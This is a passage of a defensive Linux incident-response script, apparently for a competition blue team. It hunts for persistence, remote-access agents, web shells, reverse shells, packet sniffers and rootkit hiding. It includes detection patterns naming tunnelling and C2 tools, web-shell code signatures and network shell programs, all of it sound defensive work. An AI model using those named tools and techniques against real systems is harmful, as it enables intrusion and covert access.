                say "DROPIN $(sha256sum "$f" | cut -c1-16) $f"
            done
        done
        grep -r -I -E 'LD_PRELOAD|Environment=|EnvironmentFile=' /etc/systemd/system /run/systemd/system 2>/dev/null | sed 's/^/UNITENV /'
    fi
    [ -f /etc/environment ] && grep -v '^[[:space:]]*$' /etc/environment 2>/dev/null | sed 's/^/ENVFILE /'
    # file capabilities: a modern privesc/backdoor path the SUID scan does not see
    have getcap && find /usr /bin /sbin /opt /home /etc -xdev ! -path "${BAIT:-/nonexistent}" -type f \
        -exec getcap {} + 2>/dev/null | sed 's/^/CAPS /'
    # PAM modules on disk, so a swapped pam_unix.so or a planted pam_*.so shows by hash
    for d in /lib/security /lib64/security /usr/lib/security /usr/lib/x86_64-linux-gnu/security /usr/lib64/security; do
        [ -d "$d" ] || continue
        find "$d" -name '*.so' 2>/dev/null | while read -r f; do
            say "PAMMOD $(sha256sum "$f" | cut -c1-16) $f"
        done
    done
    locked_files | sed 's/^/LOCKED /'
    # running services, so a stopped scored service shows up as GONE (T1489)
    if have systemctl; then
        systemctl list-units --type=service --state=running --no-legend --plain 2>/dev/null |
            awk '{print $1}' |
            grep -v -E '^(user@|run-|systemd-(hostnamed|localed|timedated)|packagekit|fwupd)' |
            sed 's/^/RUNNING /'
    fi
    # the firewall, so a deleted rule, a NAT redirect or a turned-off firewall shows (T1562.004)
    if have iptables; then
        iptables -S INPUT 2>/dev/null | sed 's/^/FW /'
        iptables -S OUTPUT 2>/dev/null | sed 's/^/FW /'
        iptables -t nat -S 2>/dev/null | grep -E '^-A' | sed 's/^/FWNAT /'
    fi
    have nft && say "NFT $(nft -s list ruleset 2>/dev/null | sha256sum | cut -c1-16)"
    have firewall-cmd && say "FWSTATE firewalld $(firewall-cmd --state 2>&1 | head -1)"
    have ufw && say "FWSTATE ufw $(ufw status 2>/dev/null | head -1)"
    # auditd's own files and its on/off state (T1562.001)
    for f in /etc/audit/auditd.conf /etc/audit/audit.rules /etc/audit/rules.d/* /etc/audit/plugins.d/* \
        /etc/audisp/audispd.conf /etc/audisp/plugins.d/*; do
        [ -f "$f" ] && say "AUDITCFG $(sha256sum "$f" | cut -c1-16) $f"
    done
    have auditctl && say "AUDITSTATE enabled=$(audit_enabled)"
    # security switches red team turns off (T1562.001)
    have getenforce && say "SWITCH selinux=$(getenforce 2>/dev/null)"
    [ -r /sys/module/apparmor/parameters/enabled ] && say "SWITCH apparmor=$(cat /sys/module/apparmor/parameters/enabled)"
    for s in kernel/randomize_va_space kernel/yama/ptrace_scope fs/suid_dumpable net/ipv4/ip_forward \
        kernel/modules_disabled kernel/kptr_restrict kernel/dmesg_restrict kernel/unprivileged_bpf_disabled; do
        [ -r "/proc/sys/$s" ] && say "SWITCH $s=$(cat "/proc/sys/$s")"
    done
    # how this box finds other machines: DNS servers and name lookup order (T1557, T1565)
    awk '/^nameserver/ {print "NET dns " $2}' /etc/resolv.conf 2>/dev/null
    grep '^hosts:' /etc/nsswitch.conf 2>/dev/null | sed 's/^/NET nsswitch /'
    # eBPF: programs loaded into the kernel. Modern rootkits use them (T1014).
    find /proc/[0-9]*/fdinfo -maxdepth 1 -type f -exec grep -l '^prog_type:' {} + 2>/dev/null |
        cut -d/ -f3 | sort -u | while read -r bp; do cat "/proc/$bp/comm" 2>/dev/null; done | sort -u | sed 's/^/BPF /'
    [ -d /sys/fs/bpf ] && find /sys/fs/bpf -mindepth 1 2>/dev/null | sed 's/^/BPFPIN /'
    # packages, and a fingerprint of the package database itself
    if have dpkg-query; then
        dpkg-query -W -f='${db:Status-Abbrev} ${Package} ${Version}\n' 2>/dev/null | awk '$1 ~ /^ii/ {print "PKG " $2 " " $3}'
        say "PKGDB lists=$(cat /var/lib/dpkg/info/*.list 2>/dev/null | sha256sum | cut -c1-12) sums=$(cat /var/lib/dpkg/info/*.md5sums 2>/dev/null | sha256sum | cut -c1-12)"
    elif have rpm; then
        rpm -qa --qf 'PKG %{NAME} %{VERSION}-%{RELEASE}\n' 2>/dev/null | sort
    fi
}

# ---------------------------------------------------------------- listening ports
# Every listening port with the program behind it and the account it runs as.
# A port owned by a normal login account (UID 1000+) is marked, because that is
# what a bind shell or a planted tool usually looks like.
listen_accounts() {
    printf '  %-5s %-28s %-16s %-7s %-12s %s\n' PROTO 'ADDRESS:PORT' PROGRAM PID ACCOUNT UNIT
    if have ss; then
        ss -tulnp 2>/dev/null | sed 1d | awk '{print $1, $5, $NF}'
    elif have netstat; then
        netstat -tulnp 2>/dev/null | awk '$1 ~ /^(tcp|udp)/ {print $1, $4, $NF}'
    fi | sort -u | while read -r proto addr owner; do
        pid=$(printf '%s\n' "$owner" | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p')
        prog=$(printf '%s\n' "$owner" | sed -n 's/.*(("\([^"]*\)".*/\1/p')
        if [ -z "$pid" ]; then
            case "$owner" in [0-9]*/*) pid=${owner%%/*}; prog=${owner#*/} ;; esac
        fi
        acct='' uid='' unit=''
        if [ -n "$pid" ]; then
            acct=$(ps -o user= -p "$pid" 2>/dev/null | tr -d ' ')
            uid=$(ps -o uid= -p "$pid" 2>/dev/null | tr -d ' ')
            unit=$(ps -o unit= -p "$pid" 2>/dev/null | tr -d ' ')
        fi
        mark=''
        if [ -n "$uid" ] && [ "$uid" -ge 1000 ] 2>/dev/null && [ "$uid" -ne 65534 ]; then
            mark='  <- login account, check this'
        fi
        printf '  %-5s %-28s %-16s %-7s %-12s %s%s\n' "$proto" "$addr" "${prog:--}" "${pid:--}" "${acct:-?}" "${unit:--}" "$mark"
    done
}

# ---------------------------------------------------------------- info
# Things that change all the time. Saved for the record, never compared.
info() {
    say "== $HOST at $(date)"
    uname -a
    grep -E '^(PRETTY_NAME|VERSION_ID)=' /etc/os-release 2>/dev/null
    say "== Addresses"
    ip -br a 2>/dev/null || ifconfig 2>/dev/null
    say "== Routes"
    ip route 2>/dev/null || route -n 2>/dev/null
    say "== Neighbors (ARP)"
    ip neigh 2>/dev/null || arp -an 2>/dev/null
    say "== Listening, with programs"
    ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null
    say "== Listening ports, program and account"
    listen_accounts
    say "== Established connections"
    ss -tnp state established 2>/dev/null || netstat -tnp 2>/dev/null | grep ESTAB
    say "== Top CPU"
    if ps aux --sort=-%cpu >/dev/null 2>&1; then ps aux --sort=-%cpu | head -15; else ps 2>/dev/null | head -15; fi
    say "== Firewall"
    iptables-save 2>/dev/null
    nft list ruleset 2>/dev/null
    firewall-cmd --list-all-zones 2>/dev/null
    ufw status verbose 2>/dev/null
    say "== Containers"
    kubectl get pods -A -o wide 2>/dev/null || k3s kubectl get pods -A -o wide 2>/dev/null
    docker ps -a 2>/dev/null
    crictl ps -a 2>/dev/null
    if [ -f /opt/.filetool.lst ]; then
        say "== Tiny Core persistence list (/opt/.filetool.lst)"
        cat /opt/.filetool.lst
    fi
}

packages() {
    if have dpkg-query; then dpkg-query -W -f='${Package} ${Version}\n'
    elif have rpm; then rpm -qa | sort
    elif have pacman; then pacman -Q
    elif have nixos-version; then nixos-version; nix-store -qR /run/current-system/sw 2>/dev/null
    elif [ -d /usr/local/tce.installed ]; then ls /usr/local/tce.installed
    fi
}

# ================================================================ the checks
# Each check prints its own section. These run at every hunt and at recon. They do
# not rely on the baseline: something planted BEFORE the baseline is part of it, and
# a baseline diff would never flag it. All of them are read only.

chk_self() {
    sec self "Self-check: can this box fool this script? (T1574.006, T1014)"
    sbad=0
    if [ -s /etc/ld.so.preload ]; then
        say "  /etc/ld.so.preload is NOT empty. Every program on this box loads:"
        sed 's/^/    /' /etc/ld.so.preload
        sbad=1
    fi
    # Ask the loader itself what a plain program loads. A preloaded library shows
    # here even when it hides its own name from /etc/ld.so.preload.
    sx=$(LD_TRACE_LOADED_OBJECTS=1 /bin/true 2>/dev/null |
        awk '{p = ($2 == "=>") ? $3 : $1; if (p ~ /^\//) print p}' |
        grep -v -E '/(ld-linux[^/]*|ld64[^/]*|libc\.so[^/]*|ld-musl[^/]*|libc\.musl[^/]*)$')
    if [ -n "$sx" ]; then
        say "  A plain program loads extra libraries (a rootkit trick):"
        say "$sx" | sed 's/^/    /'
        sbad=1
    fi
    # the tools this script itself uses: ps, ss, grep, sed, awk, find, sh...
    if have dpkg; then st=$(verify_pkgs $TOOL_PKGS | grep -v '^CONFIG')
    else st=$(verify_pkgs $RPM_TOOL_PKGS | grep -v '^CONFIG'); fi
    if [ -n "$st" ]; then
        say "  This script's own tools do not match their packages:"
        say "$st" | sed 's/^/    /'
        sbad=1
    fi
    sl=$(find "$VAULT" -type l 2>/dev/null)
    if [ -n "$sl" ]; then
        say "  Links inside the vault (someone could make this script write to the wrong file):"
        say "$sl" | sed 's/^/    /'
        sbad=1
    fi
    if [ "$sbad" = 1 ]; then
        flag
        nxt "tell your lead NOW. What this script shows below may be faked. Plan to restore or rebuild this box."
    else
        if [ "$(pkg_verify_kind)" = none ]; then
            ok "no preloaded libraries, and no links in the vault"
            say "  Cannot check this script's own tools against packages here: $(os_name) has no checksum database."
            say "  Run it from another box instead: ssh root@<box> 'sh -s hunt' < first30.sh"
        else
            ok "no preloaded libraries, and ps, ss, grep, sed, awk and find match their packages"
        fi
    fi
}

RAT_NAMES='meshagent meshcentral anydesk teamviewer rustdesk screenconnect connectwise atera splashtop logmein gotomypc dwagent dwservice supremo netsupport tightvnc x11vnc tigervnc vncserver ngrok chisel frpc frps gost rport ligolo imix sliver'
RAT_PORTS='16990 16991 7070 5938 6568 8041 5900 4899 8040'

chk_rat() {
    sec rat "Remote-access tools (T1219: the MeshCentral agent was the way in at the invitational)"
    rhit=0
    rcomm=$(ps -eo pid=,user=,comm= 2>/dev/null)
    rargs=$(ps -eo pid=,args= 2>/dev/null)
    runits=''
    have systemctl && runits=$(systemctl list-unit-files --no-legend 2>/dev/null | awk '{print $1}')
    for n in $RAT_NAMES; do
        m=$(printf '%s\n' "$rcomm" | awk -v n="$n" 'tolower($3) ~ ("(^|[^a-z])" n) {print "    pid " $1 " (" $2 "): " $3}')
        if [ -z "$m" ] && [ ${#n} -ge 6 ]; then
            m=$(printf '%s\n' "$rargs" | awk -v n="$n" 'index(tolower($0), n) {print "    pid " $0}')
        fi
        [ -n "$m" ] && { say "  process matches '$n':"; say "$m"; rhit=1; }
        u=$(printf '%s\n' "$runits" | grep -i -E "(^|[^a-z])$n")
        # shellcheck disable=SC2086
        [ -n "$u" ] && { say "  service matches '$n': $(printf '%s ' $u)"; rhit=1; }
    done
    for d in /usr/local/mesh* /opt/*mesh* /usr/local/mesh_services* /opt/anydesk* /etc/anydesk* \
        /opt/teamviewer* /opt/rustdesk* /opt/*screenconnect* /opt/*connectwise* /opt/splashtop* \
        /usr/bin/anydesk /usr/bin/rustdesk /usr/bin/ngrok /usr/local/bin/ngrok /usr/local/bin/chisel; do
        [ -e "$d" ] && { say "  path present: $d"; rhit=1; }
    done
    if have ss; then
        for p in $RAT_PORTS; do
            ss -tuln 2>/dev/null | awk '{print $5}' | grep -E "[:.]$p\$" >/dev/null 2>&1 &&
                { say "  listening on a known remote-access port: $p"; rhit=1; }
        done
    fi
    if [ "$rhit" = 1 ]; then
        flag
        nxt "ask your team if anyone installed it. If not: save evidence (sh first30.sh evidence <program>),"
        say "        then with your lead: systemctl disable --now <service>. Red team installed MeshCentral the day BEFORE."
    else
        ok "none found by name, folder or port"
    fi
}

chk_web() {
    sec web "Web shells (T1505.003: a page that runs commands)"
    wroots=''
    for r in /var/www /usr/share/nginx/html /srv/www /srv/http /opt/lampp/htdocs; do [ -d "$r" ] && wroots="$wroots $r"; done
    if [ -z "$wroots" ]; then ok "no web root on this box"; return 0; fi
    # Strong signs only: a command function fed straight from the web request, or
    # from decoded text. Plain eval() alone is common in real apps.
    # shellcheck disable=SC2086
    ws=$(find $wroots -xdev -type f \( -name '*.php*' -o -name '*.phtml' -o -name '*.inc' -o -name '*.jsp*' \
            -o -name '*.asp*' -o -name '*.cgi' -o -name '*.pl' -o -name '*.py' \) ! -path "${BAIT:-/nonexistent}" \
            -exec grep -l -I -E '(eval|assert|system|shell_exec|passthru|proc_open|popen|pcntl_exec|exec)[[:space:]]*\([[:space:]]*(@?\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)|base64_decode|gzinflate|str_rot13|gzuncompress)|`[[:space:]]*\$_(GET|POST|REQUEST)|preg_replace[[:space:]]*\(.*/e|Runtime\.getRuntime\(\)\.exec|ProcessBuilder|Process\.Start|cmd\.exe' {} + 2>/dev/null | head -40)
    if [ -n "$ws" ]; then
        say "  files with web-shell code (REVIEW, do not delete yet):"
        say "$ws" | while read -r f; do say "    $f   (changed $(date -r "$f" '+%m-%d %H:%M' 2>/dev/null))"; done
        flag
        nxt "open each one and look. If it is a shell: sh first30.sh evidence <file>, then remove it and find how it got there."
    else
        ok "nothing that looks like a web shell in:$wroots"
    fi
}

chk_temp() {
    sec temp "Files in temp folders (a dropper spot; T1105, T1564.001)"
    if find / -maxdepth 0 -printf '' >/dev/null 2>&1; then
        tall=$(find /tmp /var/tmp /dev/shm -maxdepth 3 -xdev \( -type f -o -type d \) -printf '%T@ %p\n' 2>/dev/null |
            sort -rn | cut -d' ' -f2-)
    else
        tall=$(find /tmp /var/tmp /dev/shm -maxdepth 3 -xdev \( -type f -o -type d \) 2>/dev/null)
    fi
    tall=$(printf '%s\n' "$tall" | grep -v -E '^/(tmp|var/tmp|dev/shm)$|^/tmp/(systemd-private-|\.X11-unix|\.ICE-unix|\.font-unix|\.XIM-unix|\.Test-unix|snap-private-tmp)|^/var/tmp/(systemd-private-|cloud-init)')
    if [ -z "$tall" ]; then ok "temp folders are empty"; return 0; fi
    # programs and hidden names first, so a long list cannot bury them
    texe=$(printf '%s\n' "$tall" | while read -r f; do
        [ -f "$f" ] || continue
        m=''
        [ -x "$f" ] && m="$m program"
        case "${f##*/}" in .*) m="$m hidden" ;; esac
        case "$f" in */.*/*) m="$m in-hidden-folder" ;; esac
        [ -n "$m" ] && printf '    %s   [%s]\n' "$f" "${m# }"
    done | head -30)
    tcount=$(printf '%s\n' "$tall" | grep -c .)
    if [ -n "$texe" ]; then
        say "  programs and hidden files (check these first):"
        say "$texe"
        flag
        nxt "look at each: ls -la <file>, then sh first30.sh evidence <file>. The imix agent was /tmp/.sysupd.bin."
    fi
    say "  $tcount items in /tmp, /var/tmp and /dev/shm in total. The newest:"
    printf '%s\n' "$tall" | head -15 | sed 's/^/    /'
    [ "$tcount" -gt 15 ] && say "    ... and $((tcount - 15)) older ones: ls -lat /tmp /var/tmp /dev/shm"
}

chk_exe() {
    sec exe "Programs running from a deleted file, a temp folder or a hidden folder (T1070.004, T1564.001)"
    xout=$(while read -r pid t; do
        case "$t" in
            *' (deleted)'|/tmp/*|/var/tmp/*|/dev/shm/*|*/.*) ;;
            *) continue ;;
        esac
        printf '  pid %s (%s): %s\n' "$pid" "$(ps -o user= -p "$pid" 2>/dev/null | tr -d ' ')" "$t"
        f=${t% (deleted)}
        case "$t" in
            /memfd:*)
                say "    it runs from memory only, with no file on disk at all (a fileless trick, T1620)."
                say "    Copy it: sh first30.sh evidence /proc/$pid/exe" ;;
            *' (deleted)')
                if [ -e "$f" ]; then
                    say "    the file was replaced while it ran (a package update does this). A restart is safe."
                elif from_package "$f"; then
                    say "    its file is GONE, so restarting it will FAIL. Put the file back first:"
                    say "    $(reinstall_cmd "$f" || echo 'reinstall the package that owns it')"
                    say "    (At the invitational, red team deleted sshd so SSH could not restart.)"
                else
                    say "    its file is gone and no package owns it. Copy it first: sh first30.sh evidence /proc/$pid/exe"
                fi ;;
        esac
    done < "$PTAB")
    if [ -n "$xout" ]; then
        say "$xout"
        flag
        nxt "save a copy of the program while it still runs: sh first30.sh evidence /proc/<pid>/exe"
    else
        ok "none"
    fi
}

chk_procs() {
    sec procs "Running programs that no package installed (T1036.005, T1543)"
    from_package /bin/sh
    if [ $? = 2 ]; then
        say "  Cannot tell here: no package list this script can read on $(os_name)."
        say "  Look at the programs in the 'temp or hidden folder' check above, and the listening programs in recon."
        return 0
    fi
    hp=" $(host_pids | tr '\n' ' ') "
    pout=$(sort -k2 "$PTAB" | awk '{p = $1; $1 = ""; sub(/^ /, ""); sub(/ \(deleted\)$/, "")
            if ($0 == last) {n++; next} if (last != "") print first, n, last; last = $0; first = p; n = 1}
            END {if (last != "") print first, n, last}' |
        while read -r pid n exe; do
            case "$hp" in *" $pid "*) ;; *) continue ;; esac   # inside a container: not this box's files
            from_package "$exe"
            [ $? = 1 ] || continue
            printf '  %s   (pid %s, account %s, %s running, file date %s)\n' "$exe" "$pid" \
                "$(ps -o user= -p "$pid" 2>/dev/null | tr -d ' ')" "$n" "$(date -r "$exe" '+%Y-%m-%d %H:%M' 2>/dev/null || echo gone)"
        done)
    if [ -n "$pout" ]; then
        say "$pout"
        say "  Some are real apps installed by hand (k3s, Vault, a CI runner). Check each one's date and what it is."
        flag
        nxt "for one you do not know: sh first30.sh evidence <program>, then ask your lead before stopping it."
    else
        ok "every running program came from a package"
    fi
}

chk_svc() {
    sec svc "Services running a program that no package installed (T1543.002, T1036.005)"
    say "  Red team gave fake services normal names: dbus-resolver, kworker-gc, sshd-session."
    if ! have systemctl || ! systemctl list-units --no-legend >/dev/null 2>&1; then ok "no systemd here"; return 0; fi
    vout=$(set -f
        { systemctl list-units --type=service --state=running --no-legend --plain 2>/dev/null | awk '{print $1}'
          systemctl list-unit-files --type=service --state=enabled --no-legend 2>/dev/null | awk '{print $1}'
        } | sort -u | while read -r u; do
            case "$u" in *@.service|'') continue ;; esac
            # shellcheck disable=SC2046
            set -- $(systemctl show -p ExecStart "$u" 2>/dev/null | sed -n 's/.*argv\[\]=\([^;]*\);.*/\1/p' | head -1)
            [ "$#" -gt 0 ] || continue
            prog=$1
            # for a script run by sh, bash or python, check the script, not the interpreter
            case "${prog##*/}" in
                sh|bash|dash|python*|perl|ruby|node|php*|env)
                    for a in "$@"; do
                        case "$a" in /*) [ "$a" != "$prog" ] && [ -f "$a" ] && { prog=$a; break; } ;; esac
                    done ;;
            esac
            from_package "$prog"
            [ $? = 1 ] || continue
            printf '  %s -> %s   (file date %s)\n' "$u" "$prog" "$(date -r "$prog" '+%Y-%m-%d %H:%M' 2>/dev/null || echo 'file missing')"
        done)
    if [ -n "$vout" ]; then
        say "$vout"
        say "  Some are real apps installed by hand (Vault, a CI runner). The MeshCentral agent was installed the day BEFORE."
        flag
        nxt "systemctl cat <service> to see it. If nobody knows it: evidence, then with your lead: systemctl disable --now <service>"
    else
        ok "every running or enabled service runs a program from a package"
    fi
}

chk_kthread() {
    sec kthread "Programs dressed up as kernel threads (T1036.004)"
    kout=$(ps -eo pid=,comm=,args= 2>/dev/null | awk -v tab="$PTAB" '
        BEGIN { while ((getline l < tab) > 0) { split(l, a, " "); exe[a[1]] = substr(l, length(a[1]) + 2) } }
        { pid = $1; comm = $2; args = $0; sub(/^ *[0-9]+ +[^ ]+ +/, "", args)
          if (!(pid in exe)) next     # real kernel threads have no program file
          if (args ~ /^\[/ || comm ~ /^(kworker|ksoftirqd|kthreadd|kswapd|migration|rcu_|kauditd|khugepaged|jbd2)/)
              printf "  pid %s shows as \"%s\" but runs %s\n", pid, args, exe[pid] }')
    if [ -n "$kout" ]; then
        say "$kout"
        flag
        nxt "real kernel threads have no program file. These do. sh first30.sh evidence /proc/<pid>/exe"
    else
        ok "none"
    fi
}

chk_shells() {
    sec shells "Shells wired to the network, and web servers starting shells (T1059.004, T1505.003)"
    # a shell whose keyboard (0) or screen (1) is a network socket is a reverse or bind shell
    sk=$(ls -l /proc/[0-9]*/fd/0 /proc/[0-9]*/fd/1 2>/dev/null | awk '/ -> socket:\[/ {
            i = index($0, " /proc/"); r = substr($0, i + 7); sub(/\/.*/, "", r); print r}' | sort -u)
    sout=''
    for pid in $sk; do
        comm=$(cat "/proc/$pid/comm" 2>/dev/null)
        case "$comm" in
            sh|bash|dash|zsh|ksh|ash|busybox|python*|perl*|ruby*|php*|lua*|nc|ncat|netcat|socat|telnet|script) ;;
            *) continue ;;
        esac
        # skip this script's own shells (run over ssh, they can have a socket for input)
        a=$pid i=0 mine=0
        while [ "$i" -lt 12 ] && [ -n "$a" ] && [ "$a" != 1 ] && [ "$a" != 0 ]; do
            [ "$a" = "$$" ] && { mine=1; break; }
            a=$(awk '/^PPid:/ {print $2}' "/proc/$a/status" 2>/dev/null)
            i=$((i + 1))
        done
        [ "$mine" = 1 ] && continue
        pp=$(awk '/^PPid:/ {print $2}' "/proc/$pid/status" 2>/dev/null)
        sout="$sout
  pid $pid ($comm, started by $(cat "/proc/$pp/comm" 2>/dev/null) pid $pp): $(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)"
    done
    wout=$(ps -eo pid=,ppid=,comm=,args= 2>/dev/null | awk '
        { c[$1] = $3; par[$1] = $2; line[$1] = $0 }
        END { for (p in c) { q = c[par[p]]
            if (c[p] ~ /^(sh|bash|dash|zsh|python[0-9.]*|perl|nc|ncat|socat|curl|wget|base64|whoami|id|uname)$/ &&
                q ~ /^(apache2|httpd|nginx|php-fpm.*|php-cgi.*|lighttpd|caddy|java|tomcat.*|uwsgi|gunicorn)$/)
                print "  pid " p " (" c[p] ") was started by the web server (" q "): " line[p] } }')
    if [ -n "$sout$wout" ]; then
        [ -n "$sout" ] && say "$sout" | sed '/^$/d'
        [ -n "$wout" ] && say "$wout"
        flag
        nxt "note the pid and who started it. ss -tnp shows where it connects. Save evidence, then block the address."
    else
        ok "no shells talking straight to the network, and no web server running a shell right now"
    fi
}

QUIET_UNDO="$VAULT/quiet_undo.txt"
SPAM_PROGS='wall write talk ytalk'

chk_spam() {
    sec spam "Terminal spam and screen watching (wall, write, tracing, console readers; T1056, T1113)"
    so=''
    sp=$(ps -eo pid=,user=,tty=,comm= 2>/dev/null | awk '$4 ~ /^(wall|write|talk|ytalk|bsd-write|write\.ul)$/ {print "    pid " $1 " " $4 ", account " $2 ", from terminal " $3}')
    [ -n "$sp" ] && so="$so
  sending messages to terminals right now:
$sp"
    if [ -s "$QUIET_UNDO" ]; then
        reopened=''
        while read -r qm qf; do
            cm=$(stat -c %a "$qf" 2>/dev/null) || continue
            case "$qf" in
                /dev/*) [ "$cm" = 600 ] || reopened=yes ;;
                *) [ "$cm" = 0 ] || so="$so
  $qf is turned back ON (mode $cm): someone undid your spam protection" ;;
            esac
        done < "$QUIET_UNDO"
        [ -n "$reopened" ] && so="$so
  console screens can be read by others again (a reboot resets /dev, or someone changed them): run quiet again"
    fi
    # a program traced by strace or gdb can have every keystroke and password read out of it
    tr=$(grep -l -E '^TracerPid:[[:space:]]*[1-9]' /proc/[0-9]*/status 2>/dev/null | while read -r st; do
            tp=$(awk '/^TracerPid:/ {print $2}' "$st" 2>/dev/null)
            p=${st#/proc/}; p=${p%/status}
            printf '    %s (pid %s) is being traced by %s (pid %s)\n' "$(cat "/proc/$p/comm" 2>/dev/null)" "$p" "$(cat "/proc/$tp/comm" 2>/dev/null)" "$tp"
        done)
    [ -n "$tr" ] && so="$so
  programs being traced (a tracer can read every key typed into them):
$tr"
    # /dev/vcs* hold the text on each console screen (what you type in the Proxmox console)
    vr=$(ls -l /proc/[0-9]*/fd 2>/dev/null | awk '/^\/proc\/[0-9]+\/fd:$/ {p = $0; sub(/^\/proc\//, "", p); sub(/\/fd:$/, "", p); next}
            / -> \/dev\/vcs/ {print p}' | sort -u | while read -r p; do
            c=$(cat "/proc/$p/comm" 2>/dev/null)
            case "$c" in gpm|brltty) continue ;; esac
            printf '    %s (pid %s) has a console screen open\n' "$c" "$p"
        done)
    [ -n "$vr" ] && so="$so
  programs reading what is on a console screen:
$vr"
    if [ -n "$so" ]; then
        say "$so" | sed '/^$/d'
        flag
        nxt "find the sender's session (who -u, or ps -t <terminal>), write it down, then kill it: pkill -9 -t <terminal>"
        say "        Then run: sh first30.sh quiet. Spam that keeps coming after that is from a root session."
    else
        ok "no one is sending to terminals, tracing programs, or reading console screens"
        [ -s "$QUIET_UNDO" ] || say "  Spam protection is not on. Turn it on: sh first30.sh quiet   (menu 11)"
    fi
}

chk_sniff() {
    sec sniff "Programs that read raw network traffic (BPFDoor-style backdoors and sniffers; T1205.002, T1040)"
    sn=$( { awk 'NR > 1 {print $NF}' /proc/net/packet 2>/dev/null
            awk 'NR > 1 {print $10}' /proc/net/raw /proc/net/raw6 2>/dev/null; } | sort -u | tr '\n' ' ')
    sout=''
    if [ -n "$(printf '%s' "$sn" | tr -d ' 0')" ]; then
        holders=$(ls -l /proc/[0-9]*/fd 2>/dev/null | awk -v want=" $sn" '
            /^\/proc\/[0-9]+\/fd:$/ {p = $0; sub(/^\/proc\//, "", p); sub(/\/fd:$/, "", p); next}
            / -> socket:\[/ {i = $NF; gsub(/[^0-9]/, "", i); if (index(want, " " i " ")) print p}' | sort -u)
        for pid in $holders; do
            exe=$(readlink "/proc/$pid/exe" 2>/dev/null)
            comm=$(cat "/proc/$pid/comm" 2>/dev/null)
            mark=''
            case "$comm" in
                dhclient|dhcpcd|NetworkManager|systemd-network*|wpa_supplicant|lldpd|keepalived|tcpdump|dumpcap|arpwatch|snort|suricata|zeek|dhcpd|udhcpc|ladvd|chronyd|ntpd|ping|ping6|traceroute|nmap|arping) ;;
                *) mark='  <- not a usual one, check it' ;;
            esac
            from_package "${exe% (deleted)}"
            [ $? = 1 ] && mark='  <- NOT from any package: likely a backdoor'
            case "$exe" in *' (deleted)') mark='  <- its program file is DELETED: likely a backdoor' ;; esac
            sout="$sout
  pid $pid $comm ($exe)$mark"
        done
    fi
    for i in /sys/class/net/*; do
        [ -d "$i/brport" ] && continue      # bridge ports are promiscuous on purpose
        fl=$(cat "$i/flags" 2>/dev/null) || continue
        case "$fl" in 0x*) ;; *) continue ;; esac
        [ $(( $fl & 256 )) -ne 0 ] && sout="$sout
  ${i##*/} is in promiscuous mode: something is reading all traffic on the wire  <- check it"
    done
    if [ -n "$sout" ]; then
        say "$sout" | sed '/^$/d'
        if printf '%s' "$sout" | grep -q '<-'; then
            flag
            nxt "a program reading raw traffic needs no open port. Save evidence (evidence /proc/<pid>/exe) and tell your lead."
        else
            say "  (these are normal network helpers)"
        fi
    else
        ok "nothing is reading raw network traffic"
    fi
}

hidden_pids() {   # PIDs that exist but do not show when /proc is listed
    hl=" $(cd /proc && echo [0-9]*) "
    hm=$(awk '{print $5}' /proc/loadavg 2>/dev/null)
    case "$hm" in ''|*[!0-9]*) hm=0 ;; esac
    for hp in $hl; do [ "$hp" -gt "$hm" ] && hm=$hp; done
    [ "$hm" -gt 400000 ] && hm=400000
    hi=1 hc=''
    while [ "$hi" -le "$hm" ]; do
        if [ -d "/proc/$hi" ]; then
            case "$hl" in
                *" $hi "*) ;;
                *) [ "$(awk '/^Tgid:/ {print $2}' "/proc/$hi/status" 2>/dev/null)" = "$hi" ] && hc="$hc $hi" ;;
            esac
        fi
        hi=$((hi + 1))
    done
    # look again, so a process that just started is not counted as hidden
    hl=" $(cd /proc && echo [0-9]*) "
    for hp in $hc; do
        case "$hl" in *" $hp "*) continue ;; esac
        [ -d "/proc/$hp" ] && say "$hp"
    done
}

hidden_ports() {   # listening TCP ports seen by ss but not in /proc/net/tcp, or the other way
    { for f in /proc/net/tcp /proc/net/tcp6; do
          [ -r "$f" ] && awk 'NR > 1 && $4 == "0A" {split($2, a, ":"); print a[2]}' "$f"
      done | sort -u | while read -r h; do printf 'P %d\n' "0x$h"; done | sort -u
      ss -tln 2>/dev/null | awk 'NR > 1 {n = split($4, a, ":"); print "S " a[n]}' | sort -u
    } | awk '{s[$2] = s[$2] $1} END {for (k in s) if (s[k] == "S") print k " (ss shows it, /proc/net/tcp hides it)"; else if (s[k] == "P") print k " (/proc/net/tcp shows it, ss hides it)"}'
}

chk_rootkit() {
    sec rootkit "Rootkit checks: things hidden from normal tools (T1014)"
    rbad=''
    rp=$(hidden_pids)
    [ -n "$rp" ] && rbad="$rbad
  hidden processes (exist, but listing /proc does not show them):$(for p in $rp; do printf '\n    pid %s: %s (%s)' "$p" "$(cat /proc/$p/comm 2>/dev/null)" "$(readlink /proc/$p/exe 2>/dev/null)"; done)"
    if have ss; then
        r1=$(hidden_ports); r2=''
        [ -n "$r1" ] && { sleep 1; r2=$(hidden_ports); }
        rpo=$(printf '%s\n' "$r1" | while IFS= read -r l; do [ -n "$l" ] && printf '%s\n' "$r2" | grep -q -x -F -- "$l" && say "    port $l"; done)
        [ -n "$rpo" ] && rbad="$rbad
  hidden listening ports:
$rpo"
    fi
    rm1=$( { for d in /sys/module/*; do [ -e "$d/initstate" ] && say "S ${d##*/}"; done
             awk '{print "P " $1}' /proc/modules 2>/dev/null; } |
           awk '{s[$2] = s[$2] $1} END {for (k in s) if (s[k] == "S") print "    " k " (loaded, but missing from the module list)"}')
    [ -n "$rm1" ] && rbad="$rbad
  hidden kernel modules:
$rm1"
    if have dmesg; then
        rb=$(dmesg 2>/dev/null | grep -i -E 'bpf_probe_write_user|bpf_override_return' | tail -3)
        [ -n "$rb" ] && rbad="$rbad
  the kernel warned about an eBPF program that changes other programs' memory (a rootkit trait):
$(say "$rb" | sed 's/^/    /')"
    fi
    if [ -n "$rbad" ]; then
        say "$rbad" | sed '/^$/d'
        flag
        nxt "tell your lead NOW. A rootkit means this box cannot be trusted. Save evidence, then restore or rebuild it."
    else
        ok "no hidden processes, ports or kernel modules"
    fi
    # kernel modules that came from outside the distribution, and eBPF owners (info)
    km=$(awk '{print $1}' /proc/modules 2>/dev/null | while read -r m; do
        kt=$(cat "/sys/module/$m/taint" 2>/dev/null)
        kf=$(modinfo -n "$m" 2>/dev/null)
        why=''
        [ -n "$kt" ] && why="taint $kt"
